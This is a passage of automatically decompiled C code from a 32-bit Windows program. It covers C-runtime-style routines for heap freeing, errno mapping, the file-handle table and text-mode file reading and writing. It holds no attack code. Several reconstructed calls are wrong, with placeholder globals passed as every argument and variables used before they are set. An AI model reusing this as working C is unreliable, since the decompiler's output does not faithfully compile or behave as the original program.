                    *v68 = *v68 & v64;
                }
            }
        }
        // 0x404a8f
        *(int32_t *)(*v55 + 4) = *v54;
        *(int32_t *)(*v54 + 8) = *v55;
        v52 = 0x1000000 * v10 / 0x1000000 + v47;
        uint32_t v69 = v52 / 16 - 1; // 0x404aad
        v53 = v69 < 63 ? v69 : 63;
    }
    int32_t v70 = v52;
    int32_t v71 = 8 * v53 + v4;
    int32_t * v72 = (int32_t *)(v71 + 4);
    int32_t * v73 = (int32_t *)(v2 + a2); // 0x404ac0
    *v73 = *v72;
    int32_t * v74 = (int32_t *)(v49 + 8); // 0x404ac3
    *v74 = v71;
    *v72 = v49;
    *(int32_t *)(*v73 + 8) = v49;
    if (*v73 == *v74) {
        char * v75 = (char *)(v1 + 4 + v53); // 0x404ad7
        char v76 = *v75; // 0x404ad7
        *v75 = v76 + 1;
        int32_t v77; // 0x40484e
        int32_t v78; // 0x40484e
        if (v53 >= 32) {
            if (v76 == 0) {
                int32_t * v79 = (int32_t *)(a1 + 4); // 0x404b1d
                *v79 = *v79 | 0x80000000 >> (v53 & 31);
            }
            // 0x404b20
            v77 = v1 + 196 + 4 * v3;
            v78 = v53 - 32;
        } else {
            if (v76 == 0) {
                int32_t * v80 = (int32_t *)a1; // 0x404afb
                *v80 = *v80 | 0x80000000 >> (v53 & 31);
            }
            // 0x404afd
            v77 = v1 + 68 + 4 * v3;
            v78 = v53;
        }
        int32_t * v81 = (int32_t *)v77; // 0x404b31
        *v81 = 0x80000000 >> (v78 & 31) | *v81;
    }
    // 0x404b33
    *(int32_t *)v49 = v70;
    *(int32_t *)(v70 + v51) = v70;
    // 0x404b3c
    *(int32_t *)((int32_t)&v12 - 4) = 1;
    // 0x404b3f
    return 1;
}

// Address range: 0x404b44 - 0x404bb7
int32_t function_404b44(int32_t a1) {
    // 0x404b44
    *(int32_t *)function_404bc0() = a1;
    int32_t v1 = &g37; // 0x404b52
    int32_t v2 = 0;
    while (*(int32_t *)v1 != a1) {
        // 0x404b5b
        v1 += 8;
        if (v1 >= (int32_t)&g39) {
            if (a1 < 37) {
                int32_t result = function_404bb7(); // 0x404b70
                *(int32_t *)result = 13;
                return result;
            }
            int32_t result2 = function_404bb7();
            int32_t * v3 = (int32_t *)result2;
            if (a1 < 203) {
                // 0x404b9d
                *v3 = 8;
                return result2;
            }
            // 0x404baa
            *v3 = 22;
            return result2;
        }
        v2++;
    }
    int32_t result3 = function_404bb7(); // 0x404b7d
    int32_t v4 = *(int32_t *)(8 * v2 + (int32_t)&g38); // 0x404b82
    *(int32_t *)result3 = v4;
    return result3;
}

// Address range: 0x404bb7 - 0x404bc0
int32_t function_404bb7(void) {
    // 0x404bb7
    return function_402e26() + 8;
}

// Address range: 0x404bc0 - 0x404bc9
int32_t function_404bc0(void) {
    // 0x404bc0
    return function_402e26() + 12;
}

// Address range: 0x404bc9 - 0x404cec
int32_t function_404bc9(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, char a10, int32_t a11) {
    // 0x404bc9
    function_403cab(18);
    int32_t v1 = 0; // 0x404be4
    int32_t v2; // bp-24, 0x404bc9
    int32_t v3 = &v2; // 0x404be4
    int32_t v4 = &g153; // 0x404be4
    int32_t v5 = -1; // 0x404be4
    int32_t v6; // 0x404bc9
    int32_t v7; // 0x404bc9
    int32_t result; // 0x404bc9
    int32_t v8; // 0x404bc9
    int32_t v9; // 0x404bc9
    int32_t v10; // 0x404bc9
    while (true) {
      lab_0x404be9:
        // 0x404be9
        result = v5;
        v9 = v3;
        v6 = v1;
        int32_t * v11 = (int32_t *)v4; // 0x404be9
        int32_t v12 = *v11; // 0x404be9
        if (v12 == 0) {
            // break -> 0x404c8d
            break;
        }
        int32_t v13 = v12; // 0x404bfc
        int32_t v14 = v12; // 0x404bfc
        int32_t v15 = v9; // 0x404bfc
        int32_t v16 = v6; // 0x404bfc
        v7 = v6;
        v3 = v9;
        v5 = result;
        if (v12 < 0xfffffb80) {
            int32_t v17 = v15;
            int32_t v18 = v14;
            char * v19 = (char *)(v18 + 4); // 0x404bfe
            int32_t v20 = v13; // 0x404c02
            int32_t v21 = v16; // 0x404c02
            int32_t v22 = v17; // 0x404c02
            int32_t v23; // 0x404c25
            int32_t v24; // 0x404bc9
            int32_t * v25; // 0x404bc9
            int32_t * v26; // 0x404bc9
            int32_t v27; // 0x404bc9
            int32_t v28; // 0x404bc9
            int32_t v29; // 0x404bc9
            int32_t * v30; // 0x404c04
            int32_t v31; // 0x404c2d
            int32_t v32; // 0x404c5a
            int32_t v33; // 0x404c65
            int32_t v34; // 0x404c65
            if ((*v19 & 1) == 0) {
                // 0x404c04
                v24 = v17 - 4;
                v27 = v24;
                if (*(int32_t *)(v18 + 8) == 0) {
                    // 0x404c0a
                    *v25 = 17;
                    function_403cab((int32_t)&g167);
                    if (*v30 == 0) {
                        // 0x404c18
                        *v25 = v18 + 12;
                        InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&g167);
                        int32_t v35 = *v30; // 0x404c22
                        *v30 = v35 + 1;
                        v23 = v17 - 8;
                        v26 = (int32_t *)v23;
                        int32_t v36 = v23; // 0x404c22
                    }
                    // 0x404c25
                    *v25 = 17;
                    function_403d0c((int32_t)&g167);
                    v27 = v24;
                }
                // 0x404c2d
                v29 = v17;
                v31 = v18 + 12;
                *(int32_t *)v24 = v31;
                EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g167);
                if ((*v19 & 1) == 0) {
                    // 0x404c55
                    v28 = v27;
                    *(int32_t *)v18 = -1;
                    v32 = v18 - *v11;
                    *(int32_t *)(v29 - 8) = 36;
                    v33 = *(int32_t *)(v29 + 16);
                    v34 = v33 + (int32_t)((0x100000000 * (int64_t)(v32 >> 31) | (int64_t)v32) / 36);
                    v10 = v28;
                    v8 = v34;
                    if (v34 != -1) {
                        goto lab_0x404cdb;
                    } else {
                        // 0x404c6e
                        v7 = *(int32_t *)(v29 + 12);
                        v3 = v28;
                        v5 = v34;
                        goto lab_0x404c72;
                    }
                }
                // 0x404c3d
                v22 = v29 - 8;
                *(int32_t *)v22 = v31;
                LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g167);
                v21 = *(int32_t *)(v29 + 8);
                v20 = *v11;
            }
            int32_t v37 = v18 + 36; // 0x404c4b
            v13 = v20;
            v16 = v21;
            v7 = v21;
            v3 = v22;
            v5 = result;
            while (v37 < v20 + 1152) {
                // 0x404bfe
                v17 = v22;
                v18 = v37;
                v19 = (char *)(v18 + 4);
                v20 = v13;
                v21 = v16;
                v22 = v17;
                if ((*v19 & 1) == 0) {
                    // 0x404c04
                    v24 = v17 - 4;
                    v27 = v24;
                    if (*(int32_t *)(v18 + 8) == 0) {
                        // 0x404c0a
                        *v25 = 17;
                        function_403cab((int32_t)&g167);
                        v26 = v25;
                        v23 = v24;
                        if (*v30 == 0) {
                            // 0x404c18
                            *v25 = v18 + 12;
                            InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&g167);
                            *v30 = *v30 + 1;
                            v23 = v17 - 8;
                            v26 = (int32_t *)v23;
                        }
                        // 0x404c25
                        *v26 = 17;
                        function_403d0c((int32_t)&g167);
                        v27 = v23;
                    }
                    // 0x404c2d
                    v29 = v17;
                    v31 = v18 + 12;
                    *(int32_t *)v24 = v31;
                    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g167);
                    if ((*v19 & 1) == 0) {
                        // 0x404c55
                        v28 = v27;
                        *(int32_t *)v18 = -1;
                        v32 = v18 - *v11;
                        *(int32_t *)(v29 - 8) = 36;
                        v33 = *(int32_t *)(v29 + 16);
                        v34 = v33 + (int32_t)((0x100000000 * (int64_t)(v32 >> 31) | (int64_t)v32) / 36);
                        v10 = v28;
                        v8 = v34;
                        if (v34 != -1) {
                            goto lab_0x404cdb;
                        } else {
                            // 0x404c6e
                            v7 = *(int32_t *)(v29 + 12);
                            v3 = v28;
                            v5 = v34;
                            goto lab_0x404c72;
                        }
                    }
                    // 0x404c3d
                    v22 = v29 - 8;
                    *(int32_t *)v22 = v31;
                    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g167);
                    v21 = *(int32_t *)(v29 + 8);
                    v20 = *v11;
                }
                // 0x404c48
                v37 = v18 + 36;
                v13 = v20;
                v16 = v21;
                v7 = v21;
                v3 = v22;
                v5 = result;
            }
        }
        goto lab_0x404c72;
    }
    int32_t * v38 = (int32_t *)(v9 - 4);
    *v38 = 1152;
    int32_t * v39 = _malloc((int32_t)&g167); // 0x404c93
    if (v39 == NULL) {
        // 0x404cdb
        *v38 = 18;
        function_403d0c((int32_t)&g167);
        return result;
    }
    int32_t v40 = (int32_t)v39; // 0x404c93
    int32_t * v41 = (int32_t *)(4 * v6 + (int32_t)&g153); // 0x404cb1
    *v41 = v40;
    int32_t v42 = v40; // 0x404cb5
    if (v39 < (int32_t *)-1152) {
        *(char *)(v42 + 4) = 0;
        *(int32_t *)v42 = -1;
        *(int32_t *)(v42 + 8) = 0;
        *(char *)(v42 + 5) = 10;
        v42 += 36;
        while (v42 < *v41 + 1152) {
            // 0x404cb7
            *(char *)(v42 + 4) = 0;
            *(int32_t *)v42 = -1;
            *(int32_t *)(v42 + 8) = 0;
            *(char *)(v42 + 5) = 10;
            v42 += 36;
        }
    }
    int32_t v43 = 32 * v6; // 0x404ccf
    *v38 = v43;
    function_404e29((int32_t)&g167);
    int32_t * v44 = v38; // 0x404cda
    int32_t result2 = v43; // 0x404cda
  lab_0x404cdb_2:
    // 0x404cdb
    *v44 = 18;
    function_403d0c((int32_t)&g167);
    return result2;
  lab_0x404cdb:
    // 0x404cdb
    v44 = (int32_t *)(v10 - 4);
    result2 = v8;
    goto lab_0x404cdb_2;
  lab_0x404c72:;
    int32_t * v45 = (int32_t *)(v3 + 20); // 0x404c72
    *v45 = *v45 + 32;
    int32_t v46 = v4 + 4; // 0x404c77
    int32_t v47 = v7 + 1; // 0x404c7a
    *(int32_t *)(v3 + 16) = v47;
    v1 = v47;
    v4 = v46;
    v10 = v3;
    v8 = v5;
    if (v46 >= (int32_t)&g155) {
        goto lab_0x404cdb;
    }
    goto lab_0x404be9;
}

// Address range: 0x404cec - 0x404d68
int32_t function_404cec(uint32_t a1, int32_t hHandle) {
    // 0x404cec
    if ((int32_t)g155 > a1) {
        int32_t * v1 = (int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x404d0e
        int32_t v2 = 36 * (a1 & 31); // 0x404d10
        int32_t * v3 = (int32_t *)(*v1 + v2);
        if (*v3 == -1) {
            // 0x404d19
            if (g13 != 1) {
                // 0x404d45
                *v3 = hHandle;
                // 0x404d65
                return 0;
            }
            int32_t nStdHandle = -10; // 0x404d2a
            if (a1 != 0) {
                int32_t v4 = a1 - 1; // 0x404d2c
                nStdHandle = -11;
                if (v4 != 0) {
                    // 0x404d2f
                    nStdHandle = -12;
                    if (v4 != 1) {
                        // 0x404d45
                        *v3 = hHandle;
                        // 0x404d65
                        return 0;
                    }
                }
            }
            // 0x404d3f
            SetStdHandle(nStdHandle, (int32_t *)hHandle);
            // 0x404d45
            *(int32_t *)(*v1 + v2) = hHandle;
            // 0x404d65
            return 0;
        }
    }
    // 0x404d4f
    *(int32_t *)function_404bb7() = 9;
    *(int32_t *)function_404bc0() = 0;
    // 0x404d65
    return -1;
}

// Address range: 0x404d68 - 0x404de7
int32_t function_404d68(uint32_t a1) {
    // 0x404d68
    if ((int32_t)g155 > a1) {
        int32_t * v1 = (int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x404d8a
        int32_t v2 = 36 * (a1 & 31); // 0x404d8c
        int32_t v3 = *v1 + v2;
        if ((*(char *)(v3 + 4) & 1) != 0) {
            int32_t * v4 = (int32_t *)v3;
            if (*v4 != -1) {
                // 0x404d9c
                if (g13 != 1) {
                    // 0x404dc4
                    *v4 = -1;
                    // 0x404de4
                    return 0;
                }
                int32_t nStdHandle = -10; // 0x404da9
                if (a1 != 0) {
                    int32_t v5 = a1 - 1; // 0x404dab
                    nStdHandle = -11;
                    if (v5 != 0) {
                        // 0x404dae
                        nStdHandle = -12;
                        if (v5 != 1) {
                            // 0x404dc4
                            *v4 = -1;
                            // 0x404de4
                            return 0;
                        }
                    }
                }
                // 0x404dbe
                SetStdHandle(nStdHandle, NULL);
                // 0x404dc4
                *(int32_t *)(*v1 + v2) = -1;
                // 0x404de4
                return 0;
            }
        }
    }
    // 0x404dce
    *(int32_t *)function_404bb7() = 9;
    *(int32_t *)function_404bc0() = 0;
    // 0x404de4
    return -1;
}

// Address range: 0x404de7 - 0x404e29
int32_t function_404de7(uint32_t a1) {
    // 0x404de7
    if ((int32_t)g155 <= a1) {
        // 0x404e12
        *(int32_t *)function_404bb7() = 9;
        *(int32_t *)function_404bc0() = 0;
        return -1;
    }
    int32_t v1 = *(int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x404dfe
    int32_t v2 = v1 + 36 * (a1 & 31);
    if ((*(char *)(v2 + 4) & 1) != 0) {
        // 0x404e0f
        return *(int32_t *)v2;
    }
    // 0x404e12
    *(int32_t *)function_404bb7() = 9;
    *(int32_t *)function_404bc0() = 0;
    return -1;
}

// Address range: 0x404e29 - 0x404e88
int32_t function_404e29(int32_t a1) {
    // 0x404e29
    int32_t v1; // bp-12, 0x404e29
    int32_t v2 = &v1; // 0x404e37
    int32_t * v3 = (int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x404e38
    int32_t v4 = *v3; // 0x404e38
    int32_t v5 = 36 * (a1 & 31); // 0x404e49
    int32_t v6 = v4 + v5; // 0x404e4c
    int32_t * v7 = (int32_t *)(v6 + 8); // 0x404e4e
    if (*v7 != 0) {
        // 0x404e77
        *(int32_t *)(v2 - 4) = v5 + 12 + v4;
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g167);
        return &g167;
    }
    struct _RTL_CRITICAL_SECTION * v8 = (struct _RTL_CRITICAL_SECTION *)17; // bp-16, 0x404e54
    function_403cab(17);
    int32_t v9 = v2; // 0x404e60
    if (*v7 == 0) {
        struct _RTL_CRITICAL_SECTION * lpCriticalSection = (struct _RTL_CRITICAL_SECTION *)(v6 + 12); // 0x404e65
        v8 = lpCriticalSection;
        InitializeCriticalSection(lpCriticalSection);
        *v7 = *v7 + 1;
        v9 = (int32_t)&v8;
    }
    int32_t * v10 = (int32_t *)(v9 - 4);
    *v10 = 17;
    function_403d0c((int32_t)&g167);
    // 0x404e77
    *v10 = v5 + 12 + *v3;
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g167);
    return &g167;
}

// Address range: 0x404e88 - 0x404eaa
int32_t function_404e88(int32_t a1) {
    int32_t v1 = *(int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x404e97
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)(36 * (a1 & 31) + 12 + v1));
    return &g167;
}

// Address range: 0x404eaa - 0x404f3d
int32_t function_404eaa(int32_t a1) {
    // 0x404eaa
    if ((int32_t)g155 <= a1) {
        // 0x404f2b
        *(int32_t *)function_404bb7() = 9;
        // 0x404f39
        return -1;
    }
    int32_t * v1 = (int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x404ecd
    int32_t v2 = 36 * (a1 & 31) + 4;
    if ((*(char *)(*v1 + v2) & 1) == 0) {
        // 0x404f2b
        *(int32_t *)function_404bb7() = 9;
        // 0x404f39
        return -1;
    }
    int32_t v3 = a1; // bp-16, 0x404ed9
    function_404e29(a1);
    int32_t v4; // bp-12, 0x404eaa
    int32_t v5 = &v4; // 0x404ee7
    int32_t result; // 0x404eaa
    int32_t v6; // 0x404eaa
    if ((*(char *)(*v1 + v2) & 1) == 0) {
        goto lab_0x404f12;
    } else {
        int32_t hFile = function_404de7(a1); // 0x404eea
        v3 = hFile;
        v5 = &v3;
        v6 = v5;
        result = 0;
        if (FlushFileBuffers((int32_t *)hFile)) {
            goto lab_0x404f20;
        } else {
            int32_t errorCode = GetLastError(); // 0x404efb
            v6 = v5;
            result = 0;
            if (errorCode == 0) {
                goto lab_0x404f20;
            } else {
                // 0x404f0b
                *(int32_t *)function_404bc0() = errorCode;
                goto lab_0x404f12;
            }
        }
    }
  lab_0x404f12:
    // 0x404f12
    *(int32_t *)function_404bb7() = 9;
    v6 = v5;
    result = -1;
    goto lab_0x404f20;
  lab_0x404f20:
    // 0x404f20
    *(int32_t *)(v6 - 4) = a1;
    function_404e88((int32_t)&g167);
    // 0x404f39
    return result;
}

// Address range: 0x404f3d - 0x404fa2
int32_t function_404f3d(uint32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x404f3d
    if ((int32_t)g155 <= a1) {
        // 0x404f8a
        *(int32_t *)function_404bb7() = 9;
        *(int32_t *)function_404bc0() = 0;
        return -1;
    }
    int32_t v1 = *(int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x404f54
    if ((*(char *)(36 * (a1 & 31) + 4 + v1) & 1) == 0) {
        // 0x404f8a
        *(int32_t *)function_404bb7() = 9;
        *(int32_t *)function_404bc0() = 0;
        return -1;
    }
    // 0x404f65
    function_404e29(a1);
    int32_t result = function_404fa2(a1, a2, a3); // 0x404f75
    function_404e88(a1);
    return result;
}

// Address range: 0x404fa2 - 0x40512d
int32_t function_404fa2(int32_t a1, int32_t lpBuffer, uint32_t nNumberOfBytesToWrite) {
    // 0x404fa2
    if (nNumberOfBytesToWrite == 0) {
        // 0x405128
        return 0;
    }
    int32_t * v1 = (int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x404fd8
    int32_t v2 = *v1; // 0x404fd8
    int32_t v3 = 36 * (a1 & 31); // 0x404fda
    int32_t v4 = v3 + 4;
    int32_t v5 = v2; // 0x404fe2
    if ((*(char *)(v2 + v4) & 32) != 0) {
        // 0x404fe4
        function_4056e3(a1, 0, 2);
        v5 = *v1;
    }
    int32_t v6 = v5 + v3; // 0x404ff4
    int32_t v7; // 0x404fa2
    int32_t v8; // 0x404fa2
    int32_t errorCode; // 0x404fa2
    int32_t errorCode2; // 0x404fa2
    int32_t v9; // 0x404fa2
    int32_t lpNumberOfBytesWritten; // bp-16, 0x404fa2
    int32_t v10; // 0x404fa2
    if (*(char *)(v6 + 4) > -1) {
        int32_t hFile = *(int32_t *)v6; // 0x4050cc
        int32_t v11 = hFile; // bp-1080, 0x4050cc
        int32_t v12 = &v11; // 0x4050cc
        if (!WriteFile((int32_t *)hFile, (int32_t *)lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, NULL)) {
            // 0x40508a
            v7 = v12;
            errorCode = GetLastError();
            goto lab_0x405095;
        } else {
            // 0x4050d8
            v10 = 0;
            errorCode2 = 0;
            v9 = lpNumberOfBytesWritten;
            v8 = v12;
            goto lab_0x40508a;
        }
    } else {
        // 0x405012
        int32_t v13; // bp-1048, 0x404fa2
        int32_t v14 = &v13; // 0x405012
        int32_t v15 = 0; // 0x404fa2
        int32_t v16 = 0; // 0x405076
        int32_t v17 = lpBuffer;
        int32_t v18; // bp-1060, 0x404fa2
        int32_t v19 = &v18; // 0x404fa2
        int32_t v20; // 0x404fa2
        int32_t v21; // 0x404fa2
        int32_t v22; // 0x405066
        while (true) {
            // 0x405012
            v20 = v16;
            int32_t v23 = v14;
            int32_t v24 = v17;
            int32_t v25 = v15;
            int32_t v26; // 0x404fa2
            int32_t v27; // 0x404fa2
            int32_t v28; // 0x404fa2
            while (v24 - lpBuffer < nNumberOfBytesToWrite) {
                char v29 = *(char *)v24; // 0x405029
                int32_t v30 = v25; // 0x40502e
                int32_t v31 = v23; // 0x40502e
                if (v29 == 10) {
                    // 0x405030
                    *(char *)v23 = 13;
                    v30 = v25 + 1;
                    v31 = v23 + 1;
                }
                int32_t v32 = v24 + 1; // 0x405026
                int32_t v33 = v30;
                *(char *)v31 = v29;
                int32_t v34 = v31 + 1; // 0x405039
                int32_t v35 = v34 - v14;
                v26 = v35;
                v27 = v33;
                v28 = v32;
                if (v35 >= 1024) {
                    goto lab_0x40504c;
                }
                v23 = v34;
                v24 = v32;
                v25 = v33;
            }
            // 0x405018
            v26 = v23 - v14;
            v27 = v25;
            v28 = v24;
          lab_0x40504c:
            // 0x40504c
            v17 = v28;
            v21 = v27;
            *(int32_t *)(v19 - 4) = 0;
            *(int32_t *)(v19 - 8) = (int32_t)&lpNumberOfBytesWritten;
            *(int32_t *)(v19 - 12) = v26;
            *(int32_t *)(v19 - 16) = v14;
            v22 = v19 - 20;
            *(int32_t *)v22 = *(int32_t *)(*v1 + v3);
            if (!WriteFile(&g167, &g167, (int32_t)&g167, &g167, (struct _OVERLAPPED *)&g167)) {
                // break -> 0x4050b6
                break;
            }
            // 0x405073
            v16 = lpNumberOfBytesWritten + v20;
            v15 = v21;
            v19 = v22;
            v10 = v21;
            errorCode2 = 0;
            v9 = v16;
            v8 = v22;
            if (v17 - lpBuffer < nNumberOfBytesToWrite != lpNumberOfBytesWritten >= v26) {
                goto lab_0x40508a;
            }
        }
        // 0x4050b6
        v10 = v21;
        errorCode2 = GetLastError();
        v9 = v20;
        v8 = v22;
        goto lab_0x40508a;
    }
  lab_0x40508a:
    // 0x40508a
    v7 = v8;
    errorCode = errorCode2;
    if (v9 != 0) {
        // 0x405128
        return v9 - v10;
    }
    goto lab_0x405095;
  lab_0x405095:
    // 0x405095
    if (errorCode == 0) {
        // 0x4050fc
        if ((*(char *)(*v1 + v4) & 64) != 0) {
            // 0x405105
            if (*(char *)lpBuffer == 26) {
                // 0x405128
                return 0;
            }
        }
        // 0x405111
        *(int32_t *)function_404bb7() = 28;
        *(int32_t *)function_404bc0() = 0;
        // 0x405128
        return -1;
    }
    int32_t * v36 = (int32_t *)(v7 - 4); // 0x40509a
    *v36 = 5;
    if (errorCode != 5) {
        // 0x4050ee
        *v36 = errorCode;
        function_404b44((int32_t)&g167);
    } else {
        // 0x4050a2
        *(int32_t *)function_404bb7() = 9;
        *(int32_t *)function_404bc0() = 5;
    }
    // 0x405128
    return -1;
}

// Address range: 0x40512d - 0x405192
int32_t function_40512d(uint32_t a1, int32_t a2, int32_t a3) {
    // 0x40512d
    if ((int32_t)g155 <= a1) {
        // 0x40517a
        *(int32_t *)function_404bb7() = 9;
        *(int32_t *)function_404bc0() = 0;
        return -1;
    }
    int32_t v1 = *(int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x405144
    if ((*(char *)(36 * (a1 & 31) + 4 + v1) & 1) == 0) {
        // 0x40517a
        *(int32_t *)function_404bb7() = 9;
        *(int32_t *)function_404bc0() = 0;
        return -1;
    }
    // 0x405155
    function_404e29(a1);
    int32_t result = function_405192(a1, a2, a3); // 0x405165
    function_404e88(a1);
    return result;
}

// Address range: 0x405192 - 0x40536b
int32_t function_405192(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405192
    if (a3 == 0) {
        // 0x405366
        return 0;
    }
    int32_t * v1 = (int32_t *)(4 * a1 / 32 + (int32_t)&g153); // 0x4051bc
    int32_t v2 = 36 * (a1 & 31); // 0x4051ca
    int32_t v3 = *v1 + v2;
    char v4 = *(char *)(v3 + 4); // 0x4051cf
    if ((v4 & 2) != 0) {
        // 0x405366
        return 0;
    }
    int32_t v5 = v3; // 0x4051de
    int32_t nNumberOfBytesToRead = a3; // 0x4051de
    int32_t v6 = 0; // 0x4051de
    int32_t lpBuffer = a2; // 0x4051de
    if ((v4 & 72) != 0) {
        char v7 = *(char *)(v3 + 5); // 0x4051e0
        v5 = v3;
        nNumberOfBytesToRead = a3;
        v6 = 0;
        lpBuffer = a2;
        if (v7 != 10) {
            // 0x4051e7
            *(char *)a2 = v7;
            *(char *)(v2 + 5 + *v1) = 10;
            v5 = *v1 + v2;
            nNumberOfBytesToRead = a3 - 1;
            v6 = 1;
            lpBuffer = a2 + 1;
        }
    }
    int32_t hFile = *(int32_t *)v5; // 0x405209
    int32_t v8 = hFile; // bp-48, 0x405209
    int32_t lpNumberOfBytesRead; // bp-16, 0x405192
    bool v9 = ReadFile((int32_t *)hFile, (int32_t *)lpBuffer, nNumberOfBytesToRead, &lpNumberOfBytesRead, NULL); // 0x40520c
    if (!v9) {
        int32_t errorCode = GetLastError(); // 0x405216
        if (errorCode == 5) {
            // 0x405223
            *(int32_t *)function_404bb7() = 9;
            *(int32_t *)function_404bc0() = 5;
            // 0x405366
            return -1;
        }
        int32_t result = 0; // 0x40523a
        if (errorCode != 109) {
            // 0x405240
            function_404b44(errorCode);
            result = -1;
        }
        // 0x405366
        return result;
    }
    int32_t result2 = lpNumberOfBytesRead + v6; // 0x405254
    int32_t v10 = v2 + 4;
    char * v11 = (char *)(*v1 + v10); // 0x40525b
    char v12 = *v11; // 0x40525b
    if (v12 > -1) {
        // 0x405366
        return result2;
    }
    char v13; // 0x405192
    if (lpNumberOfBytesRead == 0) {
        // 0x405274
        v13 = v12 & -5;
        goto lab_0x405276;
    } else {
        // 0x40526b
        if (*(char *)a2 != 10) {
            // 0x405274
            v13 = v12 & -5;
            goto lab_0x405276;
        } else {
            // 0x405270
            v13 = v12 | 4;
            goto lab_0x405276;
        }
    }
  lab_0x40533b:;
    // 0x40533b
    int32_t v14; // 0x405192
    int32_t v15 = v14; // 0x405341
    int32_t v16; // 0x405192
    int32_t v17 = v16; // 0x405341
    int32_t v18; // 0x405192
    int32_t v19 = v18; // 0x405341
    int32_t v20 = v16; // 0x405341
    uint32_t v21; // 0x405281
    if (v14 >= v21) {
        // 0x405366
        return v20 - a2;
    }
    goto lab_0x40528e;
  lab_0x4052f0:;
    // 0x4052f0
    int32_t v23; // 0x405192
    int32_t v31; // 0x405192
    int32_t v30; // 0x405192
    char v26; // bp-5, 0x405192
    int32_t hFile2; // 0x4052ce
    int32_t v27; // 0x4052d9
    if (lpNumberOfBytesRead == 0) {
        goto lab_0x405337;
    } else {
        // 0x4052f6
        if ((*(char *)(*v1 + v10) & 72) == 0) {
            if (v23 != a2) {
                goto lab_0x405322;
            } else {
                // 0x405317
                v30 = hFile2;
                v31 = v27;
                if (v26 != 10) {
                    goto lab_0x405322;
                } else {
                    goto lab_0x40531d;
                }
            }
        } else {
            // 0x4052ff
            v30 = hFile2;
            v31 = v27;
            if (v26 == 10) {
                goto lab_0x40531d;
            } else {
                // 0x405306
                *(char *)v23 = 13;
                *(char *)(v2 + 5 + *v1) = v26;
                v14 = hFile2;
                v16 = v23 + 1;
                v18 = v27;
                goto lab_0x40533b;
            }
        }
    }
  lab_0x405337:
    // 0x405337
    *(char *)v23 = 13;
    int32_t v32 = hFile2; // 0x405337
    int32_t v33 = v27; // 0x405337
    goto lab_0x40533a;
  lab_0x40531d:
    // 0x40531d
    *(char *)v23 = 10;
    v32 = v30;
    v33 = v31;
    goto lab_0x40533a;
  lab_0x40533a:
    // 0x40533a
    v14 = v32;
    v16 = v23 + 1;
    v18 = v33;
    goto lab_0x40533b;
  lab_0x405322:;
    // 0x405322
    int32_t v22; // 0x405192
    *(int32_t *)(v22 - 24) = 1;
    *(int32_t *)(v22 - 28) = -1;
    *(int32_t *)(v22 - 32) = a1;
    function_4056e3((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
    v14 = hFile2;
    v16 = v23;
    v18 = v27;
    if (v26 == 10) {
        goto lab_0x40533b;
    } else {
        goto lab_0x405337;
    }
  lab_0x405276:
    // 0x405276
    *v11 = v13;
    v21 = result2 + a2;
    if (v21 <= a2) {
        // 0x405366
        return 0;
    }
    // 0x40528e
    v15 = a2;
    v17 = a2;
    v19 = &v8;
    while (true) {
      lab_0x40528e:
        // 0x40528e
        v22 = v19;
        v23 = v17;
        uint32_t v24 = v15;
        char v25 = *(char *)v24; // 0x405291
        switch (v25) {
            case 26: {
                goto lab_0x405349;
            }
            case 13: {
                if (v24 >= v21 - 1) {
                    // 0x4052c8
                    *(int32_t *)(v22 - 4) = 0;
                    *(int32_t *)(v22 - 8) = (int32_t)&lpNumberOfBytesRead;
                    hFile2 = v24 + 1;
                    *(int32_t *)(v22 - 12) = 1;
                    *(int32_t *)(v22 - 16) = (int32_t)&v26;
                    v27 = v22 - 20;
                    *(int32_t *)v27 = *(int32_t *)(*v1 + v2);
                    bool v28 = ReadFile((int32_t *)hFile2, &g167, (int32_t)&g167, &g167, (struct _OVERLAPPED *)&g167); // 0x4052dc
                    if (v28) {
                        goto lab_0x4052f0;
                    } else {
                        // 0x4052e6
                        if (GetLastError() != 0) {
                            goto lab_0x405337;
                        } else {
                            goto lab_0x4052f0;
                        }
                    }
                } else {
                    int32_t v29 = v24 + 1; // 0x4052b3
                    if (*(char *)v29 != 10) {
                        // 0x4052bf
                        *(char *)v23 = 13;
                        v14 = v29;
                        v16 = v23 + 1;
                        v18 = v22;
                        goto lab_0x40533b;
                    } else {
                        // 0x4052b9
                        v30 = v24 + 2;
                        v31 = v22;
                        goto lab_0x40531d;
                    }
                }
            }
            default: {
                // 0x40529f
                *(char *)v23 = v25;
                v14 = v24 + 1;
                v16 = v23 + 1;
                v18 = v22;
                goto lab_0x40533b;
            }
        }
    }
  lab_0x405349:;
    char * v34 = (char *)(*v1 + v10); // 0x40534f
    char v35 = *v34; // 0x40534f
    if ((v35 & 64) == 0) {
        // 0x405355
        *v34 = v35 | 2;
    }
    // 0x405366
    return v23 - a2;
}

// Address range: 0x40536b - 0x4053af
int32_t function_40536b(int32_t a1) {
    // 0x40536b
    g77++;
    int32_t * v1 = _malloc(0x1000); // 0x405376
    int32_t * v2 = (int32_t *)(a1 + 8); // 0x405382
    *v2 = (int32_t)v1;
    int32_t * v3 = (int32_t *)(a1 + 12);
    int32_t v4 = *v3;
    if (v1 == NULL) {
        // 0x405394
        *v3 = v4 | 4;
        *v2 = a1 + 20;
        *(int32_t *)(a1 + 24) = 2;
